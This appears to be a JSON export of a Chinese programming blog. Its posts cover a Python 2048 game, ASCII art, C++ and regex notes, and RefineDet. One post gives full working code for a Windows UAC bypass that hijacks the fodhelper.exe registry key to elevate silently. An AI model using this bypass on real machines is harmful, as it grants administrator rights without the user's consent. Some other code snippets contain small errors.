{"meta":{"title":"coordinate","subtitle":null,"description":null,"author":"coordinate","url":"http://coordinate.wang"},"pages":[{"title":"","date":"2018-02-18T06:15:44.318Z","updated":"2018-02-18T06:15:34.984Z","comments":true,"path":"404.html","permalink":"http://coordinate.wang/404.html","excerpt":"","text":"404 *{margin:0;padding:0;outline:none;font-family:\\5FAE\\8F6F\\96C5\\9ED1,����;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;-khtml-user-select:none;user-select:none;cursor:default;font-weight:lighter;} .center{margin:0 auto;} .whole{width:100%;height:100%;line-height:100%;position:fixed;bottom:0;left:0;z-index:-1000;overflow:hidden;} .whole img{width:100%;height:100%;} .mask{width:100%;height:100%;position:absolute;top:0;left:0;background:#000;opacity:0.6;filter:alpha(opacity=60);} .b{width:100%;text-align:center;height:400px;position:absolute;top:50%;margin-top:-230px}.a{width:150px;height:50px;margin-top:30px}.a a{display:block;float:left;width:150px;height:50px;background:#fff;text-align:center;line-height:50px;font-size:18px;border-radius:25px;color:#333}.a a:hover{color:#000;box-shadow:#fff 0 0 20px} p{color:#fff;margin-top:40px;font-size:24px;} #num{margin:0 5px;font-weight:bold;} var num=4; function redirect(){ num--; document.getElementById(\"num\").innerHTML=num; if(num"},{"title":"Categories","date":"2016-08-16T07:00:44.000Z","updated":"2018-02-18T06:20:45.234Z","comments":false,"path":"categories/index.html","permalink":"http://coordinate.wang/categories/index.html","excerpt":"","text":""},{"title":"","date":"2015-08-16T06:58:08.000Z","updated":"2018-02-18T06:19:01.382Z","comments":true,"path":"about/index.html","permalink":"http://coordinate.wang/about/index.html","excerpt":"","text":""},{"title":"Categories","date":"2016-08-16T07:00:44.000Z","updated":"2018-02-18T06:20:59.490Z","comments":false,"path":"tags/index.html","permalink":"http://coordinate.wang/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Python实现2048","slug":"2018-02-10-python实现2048","date":"2018-02-09T16:00:00.000Z","updated":"2018-02-18T08:47:50.449Z","comments":true,"path":"2018/02/10/2018-02-10-python实现2048/","link":"","permalink":"http://coordinate.wang/2018/02/10/2018-02-10-python实现2048/","excerpt":"Tkinter是 Python 的标准 GUI 库。Python 使用 Tkinter 可以快速的创建 GUI 应用程序。 由于 Tkinter 是内置到 python 的安装包中、只要安装好 Python 之后就能import Tkinter` 库、而且 IDLE 也是用Tkinter编写而成、对于简单的图形界面Tkinter` 还是能应付自如。","text":"Tkinter是 Python 的标准 GUI 库。Python 使用 Tkinter 可以快速的创建 GUI 应用程序。 由于 Tkinter 是内置到 python 的安装包中、只要安装好 Python 之后就能import Tkinter` 库、而且 IDLE 也是用Tkinter编写而成、对于简单的图形界面Tkinter` 还是能应付自如。 首先先我们先定义几个按键和颜色、背景框大小等信息 12345678910111213141516KEY_UP = \"'w'\"KEY_DOWN = \"'s'\"KEY_LEFT = \"'a'\"KEY_RIGHT = \"'d'\"BACKGROUND_COLOR_GAME = \"#92877d\"BACKGROUND_COLOR_CELL_EMPTY = \"#9e948a\"BACKGROUND_COLOR_DICT = &#123; 2:\"#eee4da\", 4:\"#ede0c8\", 8:\"#f2b179\", 16:\"#f59563\", \\ 32:\"#f67c5f\", 64:\"#f65e3b\", 128:\"#edcf72\", 256:\"#edcc61\", \\ 512:\"#edc850\", 1024:\"#edc53f\", 2048:\"#edc22e\" &#125;CELL_COLOR_DICT = &#123; 2:\"#776e65\", 4:\"#776e65\", 8:\"#f9f6f2\", 16:\"#f9f6f2\", \\ 32:\"#f9f6f2\", 64:\"#f9f6f2\", 128:\"#f9f6f2\", 256:\"#f9f6f2\", \\ 512:\"#f9f6f2\", 1024:\"#f9f6f2\", 2048:\"#f9f6f2\" &#125;FONT = (\"Verdana\", 40, \"bold\")SIZE = 500GRID_LEN = 4GRID_PADDING = 10 接着我们来写一个GameGrid类，这个类继承自Tkinter的Frame 1234567891011121314151617class GameGrid(Frame): def __init__(self): Frame.__init__(self) self.commands = &#123;KEY_UP: up, KEY_DOWN: down, KEY_LEFT: left, KEY_RIGHT: right&#125; def init_grid(self): pass def gen(self): pass def init_matrix(self): pass def update_grid_cells(self): pass def key_down(self, event): pass def generate_next(self): pass 定好框架后，我们来写各个函数，先来写一个矩阵处理函数reverse，这个函数主要将矩阵 12345678910111213'''1 2 3 3 2 14 5 6 ==&gt; 6 5 47 8 9 9 8 7'''def reverse(mat): new=[] x=y=len(mat) for i in range(x): new.append([]) for j in range(y): new[i].append(mat[i][y-j-1]) return new 接着定义函数transpose，计算矩阵转置 12345678910111213'''1 2 3 1 4 74 5 6 ==&gt; 2 5 87 8 9 3 6 9'''def transpose(mat): new=[] x=y=len(mat) for i in range(y): new.append([]) for j in range(x): new[i].append(mat[j][i]) return new 定义函数cover_up 12345678910111213141516171819''' 0 0 2 1 2 1 0 0 6 6 5 4 ==&gt; 6 6 5 4 0 9 8 7 9 8 7 010 11 12 13 10 11 12 13'''def cover_up(mat): x=y=len(mat) new=[x*[0] for i in range(y)] done=False for i in range(x): count=0 for j in range(y): if mat[i][j]!=0: new[i][count]=mat[i][j] if j!=count: done=True count+=1 return (new,done) 定义函数merge，也就是一个合并函数 12345678910111213141516''' 0 0 2 1 2 1 0 0 6 6 5 4 ==&gt; 12 0 5 4 0 9 8 7 9 8 7 010 11 12 13 10 11 12 13'''def merge(mat): done=False x=y=len(mat) for i in range(x): for j in range(y-1): if mat[i][j]==mat[i][j+1] and mat[i][j]!=0: mat[i][j]*=2 mat[i][j+1]=0 done=True return (mat,done) 接着我们处理up、down、right、left函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758''' 0 0 2 1 6 6 2 1 6 6 5 4 ==&gt; 10 9 5 4 0 9 8 7 0 11 8 710 11 12 13 0 0 12 13'''def up(game): game=transpose(game) game,done=cover_up(game) temp=merge(game) game=temp[0] done=done or temp[1] game=cover_up(game)[0] game=transpose(game) return (game,done)''' 0 0 2 1 0 0 2 1 6 6 5 4 ==&gt; 0 6 5 4 0 9 8 7 6 9 8 710 11 12 13 10 11 12 13'''def down(game): game=reverse(transpose(game)) game,done=cover_up(game) temp=merge(game) game=temp[0] done=done or temp[1] game=cover_up(game)[0] game=transpose(reverse(game)) return (game,done)''' 0 0 2 1 2 1 0 0 6 6 5 4 ==&gt; 12 5 4 0 0 9 8 7 9 8 7 010 11 12 13 10 11 12 13'''def left(game): game,done=cover_up(game) temp=merge(game) game=temp[0] done=done or temp[1] game=cover_up(game)[0] return (game,done)''' 0 0 2 1 0 0 2 1 6 6 5 4 ==&gt; 0 12 5 4 0 9 8 7 0 9 8 010 11 12 13 10 11 12 13'''def right(game): game=reverse(game) game,done=cover_up(game) temp=merge(game) game=temp[0] done=done or temp[1] game=cover_up(game)[0] game=reverse(game) return (game,done) 接着定义init_grid这个图像初始化函数 1234567891011121314151617def init_grid(self): #定义背景颜色和大小 background = Frame(self, bg=BACKGROUND_COLOR_GAME, width=SIZE, height=SIZE) #绘制背景 background.grid() for i in range(GRID_LEN): grid_row = [] for j in range(GRID_LEN): #定义每个背景小方格的颜色和大小 cell = Frame(background, bg=BACKGROUND_COLOR_CELL_EMPTY, width=SIZE/GRID_LEN, height=SIZE/GRID_LEN) #填充小方格的分割线 cell.grid(row=i, column=j, padx=GRID_PADDING, pady=GRID_PADDING) #将label加入到frame中 t = Label(master=cell, text=\"\", bg=BACKGROUND_COLOR_CELL_EMPTY, justify=CENTER, font=FONT, width=4, height=2) t.grid() grid_row.append(t) self.grid_cells.append(grid_row) 接着我们定义一个产生随机数的函数gen 123def gen(): #产生[0, GRID_LEN-1]之间的随机数 return randint(0, GRID_LEN - 1) 接着我们开始定义游戏逻辑函数，首先定义new_game函数，这个函数用来初始化n*n矩阵为0 123def new_game(n): matrix = [[0]*n for i in range(n)] return matrix 接着我们定义坐标产生函数generate_next 1234567def generate_next(self): #产生随机坐标xy index = (self.gen(), self.gen()) #如果坐标xy格子对应的数字不是0的话，重新产生坐标 while self.matrix[index[0]][index[1]] != 0: index = (self.gen(), self.gen()) self.matrix[index[0]][index[1]] = 2 接着我们定义矩阵初始化函数init_matrix（逻辑上） 123456def init_matrix(self): #初始化矩阵 self.matrix = new_game(4) #随机初始化两个格子 self.generate_next() self.generate_next() 接着我们定义格子初始化函数update_grid_cells（图形上） 123456789101112def update_grid_cells(self): for i in range(GRID_LEN): for j in range(GRID_LEN): #获取每个格子的数值 new_number = self.matrix[i][j] #如果格子的数值为0，设置对应的格子背景颜色 if new_number == 0: self.grid_cells[i][j].configure(text=\"\", bg=BACKGROUND_COLOR_CELL_EMPTY) else:#如果格子的数值不为0，设置对应的格子背景颜色，不同数字对应不同背景 self.grid_cells[i][j].configure(text=str(new_number), bg=BACKGROUND_COLOR_DICT[new_number], fg=CELL_COLOR_DICT[new_number]) #更新所有的操作 self.update_idletasks() 我们定义游戏状态函数game_state 12345678910111213141516171819202122def game_state(mat): x=y=len(mat) for i in range(x): for j in range(y): #如果矩阵有数是2048，那么就赢了 if mat[i][j]==2048: return 'win' for i in range(x-1): for j in range(y-1): if mat[i][j]==mat[i+1][j] or mat[i][j+1]==mat[i][j]: return 'not over' for i in range(x): for j in range(len(y): if mat[i][j]==0: return 'not over' for k in range(x-1): if mat[x-1][k]==mat[x-1][k+1]: return 'not over' for j in range(x-1): if mat[j][x-1]==mat[j+1][x-1]: return 'not over' return 'lose' 接着我们定义按键处理函数key_down 12345678910111213141516171819def key_down(self, event): #得到输入的按键 key = repr(event.char) if key in self.commands: self.matrix,done = self.commands[key](self.matrix) if done: #产生新的坐标 self.generate_next() #图形上更新小方格 self.update_grid_cells() done=False #如果游戏状态为赢的话 if game_state(self.matrix)=='win': self.grid_cells[1][1].configure(text=\"You\",bg=BACKGROUND_COLOR_CELL_EMPTY) self.grid_cells[1][2].configure(text=\"Win!\",bg=BACKGROUND_COLOR_CELL_EMPTY) #如果游戏状态为输的话 if game_state(self.matrix)=='lose': self.grid_cells[1][1].configure(text=\"You\",bg=BACKGROUND_COLOR_CELL_EMPTY) self.grid_cells[1][2].configure(text=\"Lose!\",bg=BACKGROUND_COLOR_CELL_EMPTY) 回顾上面的所有细节，我们发现最困难的地方就在于矩阵的处理上面 项目地址，give me a star O(∩_∩)O！","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"}]},{"title":"图片转化为字符画","slug":"2018-02-09-图片转字符画","date":"2018-02-08T16:00:00.000Z","updated":"2018-02-18T08:47:37.819Z","comments":true,"path":"2018/02/09/2018-02-09-图片转字符画/","link":"","permalink":"http://coordinate.wang/2018/02/09/2018-02-09-图片转字符画/","excerpt":"我们在使用linux的软件的时候经常会看到这样的字符画。 你千万别认为是像C语言那样一个个字符打上去的^_^！今天我将通过python实现一个图片转化为字符画的小工具。 首先我们需要定义一些字符，我们这里定义了这些字符 1ASSIIC_CHAR = list(\"123q$e@x\")","text":"我们在使用linux的软件的时候经常会看到这样的字符画。 你千万别认为是像C语言那样一个个字符打上去的^_^！今天我将通过python实现一个图片转化为字符画的小工具。 首先我们需要定义一些字符，我们这里定义了这些字符 1ASSIIC_CHAR = list(\"123q$e@x\") 我们希望我们输出的字符是有颜色的，这里我们用到了colorama里面的Fore，也就是前景色。具体用法如下 123COLORS = [Fore.BLACK, Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]COLORS_RGB = [(0,0,0), (255,0,0), (0, 255,0), (255,255,0), (0,0,255), (255,0,255), (0,255,255), (255,255,255)]print(COLORS[i]+\"string\") 因为这里只有8种颜色，所以我们的字符数量也是8个。 接着我们定义计算颜色距离的函数，也就是描述两种颜色之间的相似程度 123456def i2(r, g, b): color_len = [] for i in COLORS_RGB: temp = (i[0] - r)*(i[0] - r) + (i[1] - g)*(i[1] - g) + (i[2] - b)*(i[2] - b) color_len.append(temp) return color_len.index(min(color_len)) 接着我们定义获取字符的函数 123def get_char(r, g, b, a=256): i = i2(r, g, b) return ASSIIC_CHAR[i], i 通过这个函数，我们获得各颜色对应的字符以及各自的位置。 最后在主函数中打开一幅图片，并且对图片大小重新定义，读取重定义后的每个图片的像素，测算像素对应的颜色。 123456789101112if __name__ == '__main__': pic = Image.open(IMG) pic = pic.resize((WIDTH, HEIGHT), Image.NEAREST) pic.show() txt = \"\" for i in range(HEIGHT): for j in range(WIDTH): ch, w = get_char(*pic.getpixel((j, i))) print(COLORS[w]+ch*3, end='') txt += ch print('\\n') txt += '\\n' 最后的效果图 项目地址，give me a star O(∩_∩)O！","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"}]},{"title":"c++中空字符串解释为True的困惑","slug":"2018-02-05-c++中空字符串解释为True的困惑","date":"2018-02-04T16:00:00.000Z","updated":"2018-02-18T08:47:31.145Z","comments":true,"path":"2018/02/05/2018-02-05-c++中空字符串解释为True的困惑/","link":"","permalink":"http://coordinate.wang/2018/02/05/2018-02-05-c++中空字符串解释为True的困惑/","excerpt":"首先我们看这样这个问题 123456int main ( )&#123; if (\"\") cout &lt;&lt; \"hello\"; // executes! return 0;&#125; 这对于其他非c++的程序员来说是很困惑的。为什么空的字符串是True？","text":"首先我们看这样这个问题 123456int main ( )&#123; if (\"\") cout &lt;&lt; \"hello\"; // executes! return 0;&#125; 这对于其他非c++的程序员来说是很困惑的。为什么空的字符串是True？ 这个问题其实归根到底是NULL与空字符串的区别。 空字符串实际上是const char[1]，这不是NULL，自然是True。 其实我觉得这是一个很深刻的问题，到底什么是空？佛说：“空即是色，色即是空”。那么c++中什么是空？ The curious =0 syntax was chosen over the obvious alternative of introducing a new keyword pure or abstract because at the time I saw no chance of getting a new keyword accepted. Had I suggested pure, Release 2.0 would have shipped without abstract classes. Given a choice between a nicer syntax and abstract classes, I chose abstract classes. Rather than risking delay and incurring the certain fights over pure, I used the tradition C and C++ convention of using 0 to represent “not there.” The =0 syntax fits with my view that a function body is the initializer for a function also with the (simplistic, but usually adequate) view of the set of virtual functions being implemented as a vector of function pointers. 以上是Bjarne的The Design and Evolution of C++中的一段话 A second alternative solution would be to accept (void*)0 as a “magic” pointer value with roughly the semantics of the nullptr proposed in section 2.However, this solution has serious problems:​ It would still be necessary for programmers to use the macro NULL to name the null pointer (the notation (void*)0 is just too ugly).​ Furthermore, (void*)0 would have to have a unique semantics; that is, its type would not be void*. We do not consider opening the C type hole by allowing any value of type void* to any T*.The introduction of nullptr as proposed in section 2 is a far cleaner solution. 今天闲暇时看网上别人的问题，偶尔看到这个问题。于是相对其作一番解释，毕竟我自己定位是一名c++程序员。","categories":[{"name":"c++","slug":"c","permalink":"http://coordinate.wang/categories/c/"}],"tags":[{"name":"c++","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"空字符串","slug":"空字符串","permalink":"http://coordinate.wang/tags/空字符串/"}]},{"title":"python字符串令牌解析","slug":"2018-01-26-python字符串令牌解析","date":"2018-01-25T16:00:00.000Z","updated":"2018-02-18T08:47:22.407Z","comments":true,"path":"2018/01/26/2018-01-26-python字符串令牌解析/","link":"","permalink":"http://coordinate.wang/2018/01/26/2018-01-26-python字符串令牌解析/","excerpt":"在分析这个问题之前，我们先看一下什么是分组。在正则表达式中，括号括起来的部分是一个分组。例如 123456789import retext = 'Today is 11/27/2012. PyCon starts 3/13/2013.'datepat = re.compile(r'(\\d+)/(\\d+)/(\\d+)')m = datepat.match('11/27/2012')print(m.group(0))print(m.group(1))print(m.group(2))print(m.group(3))print(m.groups())","text":"在分析这个问题之前，我们先看一下什么是分组。在正则表达式中，括号括起来的部分是一个分组。例如 123456789import retext = 'Today is 11/27/2012. PyCon starts 3/13/2013.'datepat = re.compile(r'(\\d+)/(\\d+)/(\\d+)')m = datepat.match('11/27/2012')print(m.group(0))print(m.group(1))print(m.group(2))print(m.group(3))print(m.groups()) 输出结果为 1234511/27/201211272012('11', '27', '2012') 这里面我们使用了group函数，我们通过这个函数可以获得对应序号的group，group(0)表示整个匹配到的整个字符串，group(1)对应的是11，group(2)对应的是27，group(3)对应的是2012。我们可以通过groups得到所有group组成的元组。 (?P&lt;name&gt;...)分组，除了原有的编号外，指定一个额外的别名name。例如 1234567import retext = 'Today is 11/27/2012. PyCon starts 3/13/2013.'datepat = re.compile(r'(?P&lt;day&gt;\\d+)/(?P&lt;month&gt;\\d+)/(?P&lt;year&gt;\\d+)')m = datepat.match('11/27/2012')print(m.group('day'))print(m.group('month'))print(m.group('year')) 结果是 12311272012 现在我们继续。我们看这样一个问题，我们有这样一个字符串 1text = 'foo = 23 + 42 * 10' 我们希望字符串转化为像下面这样的序列对： 1tokens = [('NAME', 'foo'), ('EQ','='), ('NUM', '23'), ('PLUS','+'),('NUM', '42'), ('TIMES', '*'), ('NUM', 10')] 我们可以通过这样的方法 1234567891011121314151617import reNAME = r'(?P&lt;NAME&gt;[a-zA-Z_][a-zA-Z_0-9]*)'NUM = r'(?P&lt;NUM&gt;\\d+)'PLUS = r'(?P&lt;PLUS&gt;\\+)'TIMES = r'(?P&lt;TIMES&gt;\\*)'EQ = r'(?P&lt;EQ&gt;=)'WS = r'(?P&lt;WS&gt;\\s+)'master_pat = re.compile('|'.join([NAME, NUM, PLUS, TIMES, EQ, WS]))scanner = master_pat.scanner('foo = 23 + 42 * 10')first=scanner.match()print(first.lastgroup,first.group())first=scanner.match()print(first.lastgroup,first.group())first=scanner.match()print(first.lastgroup,first.group())first=scanner.match()print(first.lastgroup,first.group()) 输出结果为 1234NAME fooWS #匹配空字符EQ =WS 为了令牌化，使用模式对象很少被人知道的 scanner() 方法。这个方法会创建一个scanner对象，在这个对象上不断的调用 match() 方法会一步步的扫描目标文本，每步一个匹配。我们通过属性lastgroup输出匹配到的字符串别名，通过group函数匹配到具体字符。 这个功能一般情况下用不到，我只此记录。","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"字符串令牌","slug":"字符串令牌","permalink":"http://coordinate.wang/tags/字符串令牌/"}]},{"title":"RefineDet论文笔记","slug":"2018-01-15-RefineDet论文笔记","date":"2018-01-14T16:00:00.000Z","updated":"2018-02-18T08:47:13.604Z","comments":true,"path":"2018/01/15/2018-01-15-RefineDet论文笔记/","link":"","permalink":"http://coordinate.wang/2018/01/15/2018-01-15-RefineDet论文笔记/","excerpt":"论文地址：Single-Shot Refinement Neural Network for Object Detection 项目地址：RefineDet 0x01 Abstract当前的目标检测网络主要分为两大类： single-stage：SSD、YOLO、YOLO9000 two-stage：Faster RCNN 、 R-FCN、Mask R-CNN single-stage通过对位置，比例和长宽进行规则和密度采样来检测对象。two-stage首先选取目标区域，然后对目标分类。single-stage方法速度快，但是检测精度比two-stage低。","text":"论文地址：Single-Shot Refinement Neural Network for Object Detection 项目地址：RefineDet 0x01 Abstract当前的目标检测网络主要分为两大类： single-stage：SSD、YOLO、YOLO9000 two-stage：Faster RCNN 、 R-FCN、Mask R-CNN single-stage通过对位置，比例和长宽进行规则和密度采样来检测对象。two-stage首先选取目标区域，然后对目标分类。single-stage方法速度快，但是检测精度比two-stage低。 因此作者提出了RefineDet方法，同行继承了two-stage和single-stage两者的优点。它有两个模块构成，一个是anchor细化模块（ARM）一个是目标检测模块（ODM）。 ARM模块用来减小分类器的搜索空间，粗略地描述anchor的位置和大小。通过连接模块（TCB）将ARM中的特征，传输给ODM模块，以获取更加准确的目标位置和大小。 其实这里我们可以知道，这个网络的好处就是将那个原来two-stage的串行结构转化成了并行结构。很不错的思想！！！ 0x02 网络结构和SSD一样，RefineDet采用前馈网络，该网络产生固定数量的框，并且区分框中的不同类别对象，最后非极大值抑制输出最终结果。 RefineDet有两个互相连接的模块ARM和ODM组成。这两个模块之间通过TCB模块连接 而且这里的TCB是将不同层次的ARM特征转化为ODM，它这里有一个回传的操作，将高层次的特征通过去卷机操作（实际是一种转置卷积），使特征图之间的尺寸匹配，然后与低层次的特征相加。 针对小目标的识别，作者这里采用了两步级联回归。在ARM中先调整anchor的位置和大小，然后用这种粗略的操作作为ODM的输入，最后ODM再进一步检测和识别物体，这种做法会有更加精确的检测结果。 single-stage精度落后于two-stage的一个主要原因是类别不平衡问题。为了解决这种问题，作者采用了Negative anchor过滤。在训练阶段，针对ARM中的anchor，如果negative confidence大于一个阈值$\\theta$（$\\theta=0.99$），那么在训练ODM时将它舍弃。也就是通过hard Negative anchor和ARM anchor来训练ODM。 RefineDet的损失函数由两部分组成，即ARM中的损失和ODM中的损失。损失函数定义为 $L({p_i},{x_i},{c_i},{t_i}) = \\frac{1}{N_{arm}}(\\sum_iL_b(p_i, [l_i^ \\geq1])+\\sum_i[l_i^ \\geq1]L_r(x_i,g_i^)+\\frac{1}{N_{odm}}(\\sum_iL_m(c_i,l_i^)+\\sum_i[l_i^\\geq1]L_r(t_i,g_i^))$ 其中i表示一个batch中的第几个anchor，$l_i^$表示anchor_i的ground truth的类别 ，$g_i^$表示anchor_i的ground truth位置和大小，$p_i$b表示置信度，$x_i$表示ARM中anchor的坐标。$c_i$表示预测类别，$t_i$表示ODM中的预测框坐标信息。$N_{arm}$和$N_{odm}$分别表示ARM和ODM中的positive anchor数量。$L_b$表示二值分类损失（有目标\\没有目标），$L_m$表示多类别损失，$L_r$表示回归损失。$[l_i^\\geq1]$就表示如果negative confidence大于一个阈值$\\theta$，那么返回1，否则返回0。如果$N_{arm}=0$，设置$L_b(p_i, [l_i^ \\geq1])=0$和$L_r(x_i,g_i^)=0$；如果$N_{odm}=0$，那么设置$L_m(c_i,l_i^)=0$和$L_r(t_i,g_i^*)=0$。 0x03 训练结果","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"YOLO","slug":"YOLO","permalink":"http://coordinate.wang/tags/YOLO/"},{"name":"darknet","slug":"darknet","permalink":"http://coordinate.wang/tags/darknet/"}]},{"title":"AttributeError 'dict' object has no attribute 'items' 问题","slug":"2018-01-09-has-no-attribute-items问题","date":"2018-01-08T16:00:00.000Z","updated":"2018-02-18T08:53:40.222Z","comments":true,"path":"2018/01/09/2018-01-09-has-no-attribute-items问题/","link":"","permalink":"http://coordinate.wang/2018/01/09/2018-01-09-has-no-attribute-items问题/","excerpt":"其实这是一个很小的问题，但是我看到网上很多答案不怎么喜欢，所以写一下。 我们通常这样做的时候 1dict_obj.has_key(key1) 这样做在python3中会报错。因为python3中去除了has_key这个方法。","text":"其实这是一个很小的问题，但是我看到网上很多答案不怎么喜欢，所以写一下。 我们通常这样做的时候 1dict_obj.has_key(key1) 这样做在python3中会报错。因为python3中去除了has_key这个方法。 看到网上很多人这样去做 1if key1 in dict_obj: 这样做肯定是没有问题的。 但是难道python3下面就没有一个和has_key功能一样的函数吗？有！！！ 1dict_obj.__contains__(key1) 这才是最符合python3的做法。","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"dict","slug":"dict","permalink":"http://coordinate.wang/tags/dict/"}]},{"title":"python如果获取windows管理员权限（二）","slug":"2018-01-08-python如果获取windows管理员权限（二）","date":"2018-01-07T16:00:00.000Z","updated":"2018-02-18T08:46:56.696Z","comments":true,"path":"2018/01/08/2018-01-08-python如果获取windows管理员权限（二）/","link":"","permalink":"http://coordinate.wang/2018/01/08/2018-01-08-python如果获取windows管理员权限（二）/","excerpt":"我们在python如果获取windows管理员权限（一）中谈到了UAC的问题。 很多时候我们不希望我们的软件弹出UAC提示，这个时候我们可以通过注册表的方法去解决。这其实已经不在是一个安全的编程了，它变成了一把双刃剑。 当然我们只是讨论这种问题该怎么解决。具体用在什么方面那是你的问题咯！ 通过下面的代码我们可以轻松绕过UAC","text":"我们在python如果获取windows管理员权限（一）中谈到了UAC的问题。 很多时候我们不希望我们的软件弹出UAC提示，这个时候我们可以通过注册表的方法去解决。这其实已经不在是一个安全的编程了，它变成了一把双刃剑。 当然我们只是讨论这种问题该怎么解决。具体用在什么方面那是你的问题咯！ 通过下面的代码我们可以轻松绕过UAC 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# -*- coding: utf-8 -*-\"\"\"Created on Mon Jan 8 09:09:51 2018@author: coordinate\"\"\"from __future__ import print_functionimport osimport sysimport ctypesif sys.version_info[0] == 3: import winreg as winregelse: import _winreg as winreg CMD = r\"C:\\Windows\\System32\\cmd.exe\"FOD_HELPER = r'C:\\Windows\\System32\\fodhelper.exe'PYTHON_CMD = \"python\"REG_PATH = 'Software\\Classes\\ms-settings\\shell\\open\\command'DELEGATE_EXEC_REG_KEY = 'DelegateExecute'def is_admin(): ''' Checks if the script is running with administrative privileges. Returns True if is running as admin, False otherwise. ''' try: return ctypes.windll.shell32.IsUserAnAdmin() except: return False def create_reg_key(key, value): ''' Creates a reg key ''' try: winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH) registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE) winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value) winreg.CloseKey(registry_key) except WindowsError: raise def bypass_uac(cmd): ''' Tries to bypass the UAC ''' try: create_reg_key(DELEGATE_EXEC_REG_KEY, '') create_reg_key(None, cmd) except WindowsError: raise def execute(): if not is_admin(): print('[!] The script is NOT running with administrative privileges') print('[+] Trying to bypass the UAC') try: current_dir = __file__ cmd = '&#123;&#125; /k &#123;&#125; &#123;&#125;'.format(CMD, PYTHON_CMD, current_dir) bypass_uac(cmd) os.system(FOD_HELPER) sys.exit(0) except WindowsError: sys.exit(1) else: #这里添加我们需要管理员权限的代码 print('[+] The script is running with administrative privileges!') if __name__ == '__main__': execute() 其实我们这个代码这里主要是往注册表中添加了这两项","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"windows","slug":"windows","permalink":"http://coordinate.wang/tags/windows/"}]},{"title":"python如果获取windows管理员权限（一）","slug":"2018-01-07-python如果获取windows管理员权限（一）","date":"2018-01-06T16:00:00.000Z","updated":"2018-02-18T08:46:44.057Z","comments":true,"path":"2018/01/07/2018-01-07-python如果获取windows管理员权限（一）/","link":"","permalink":"http://coordinate.wang/2018/01/07/2018-01-07-python如果获取windows管理员权限（一）/","excerpt":"我们在运行我们编写好的python代码时，会碰到这样的报错问题 1PermissionError: [WinError 5] 拒绝访问。 这是因为我们编写的脚本的权限不够。一种解决办法是在管理员cmd中运行我们的脚本（右键以 run as administrator），但是这种办法不够优雅。我们经常看到当我们运行一些需要高权限的软件时，会弹出以下对话框 这被称为用户安全控制，简称为UAC。","text":"我们在运行我们编写好的python代码时，会碰到这样的报错问题 1PermissionError: [WinError 5] 拒绝访问。 这是因为我们编写的脚本的权限不够。一种解决办法是在管理员cmd中运行我们的脚本（右键以 run as administrator），但是这种办法不够优雅。我们经常看到当我们运行一些需要高权限的软件时，会弹出以下对话框 这被称为用户安全控制，简称为UAC。 用户帐户控制（User Account Control，简写作UAC)是微软司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器8)和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果。 那么我们在写代码的时候怎么添加这个功能呢？ 这里我们要用到一个关键的函数ShellExecute 12345678HINSTANCE ShellExecute( _In_opt_ HWND hwnd, _In_opt_ LPCTSTR lpOperation, _In_ LPCTSTR lpFile, _In_opt_ LPCTSTR lpParameters, _In_opt_ LPCTSTR lpDirectory, _In_ INT nShowCmd); 具体细节看微软官方的文档ShellExecute function.aspx) 123456789101112131415from __future__ import print_functionimport ctypes, sysdef is_admin(): try: return ctypes.windll.shell32.IsUserAnAdmin() except: return Falseif is_admin(): # 将要运行的代码加到这里else: if sys.version_info[0] == 3: ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, __file__, None, 1) else:#in python2.x ctypes.windll.shell32.ShellExecuteW(None, u\"runas\", unicode(sys.executable), unicode(__file__), None, 1) 要提醒你的是，不要在IDE中运行。 如果在非管理员权限下运行的话，其实这里运行了两次代码，第一次肯定是没有管理员权限的，第二次拥有管理员权限。 有的时候我们不希望有这种UAC弹框，我们希望程序偷偷的拥有管理员权限，这要怎么做呢？这其实挺邪恶的。感兴趣的话，可以看这篇python如果获取windows管理员权限（二）","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"windows","slug":"windows","permalink":"http://coordinate.wang/tags/windows/"}]},{"title":"YOLOv2源码分析--reorg layer","slug":"2018-01-01-YOLOv2源码分析--reorg layer","date":"2017-12-31T16:00:00.000Z","updated":"2018-02-18T08:46:29.814Z","comments":true,"path":"2018/01/01/2018-01-01-YOLOv2源码分析--reorg layer/","link":"","permalink":"http://coordinate.wang/2018/01/01/2018-01-01-YOLOv2源码分析--reorg layer/","excerpt":"文章全部YOLOv2源码分析 reorg layer中最关键的代码如下 12345678910111213141516171819202122void reorg_cpu(float *x, int w, int h, int c, int batch, int stride, int forward, float *out)&#123; int b,i,j,k; int out_c = c/(stride*stride); for(b = 0; b &lt; batch; ++b)&#123; for(k = 0; k &lt; c; ++k)&#123; for(j = 0; j &lt; h; ++j)&#123; for(i = 0; i &lt; w; ++i)&#123; int in_index = i + w*(j + 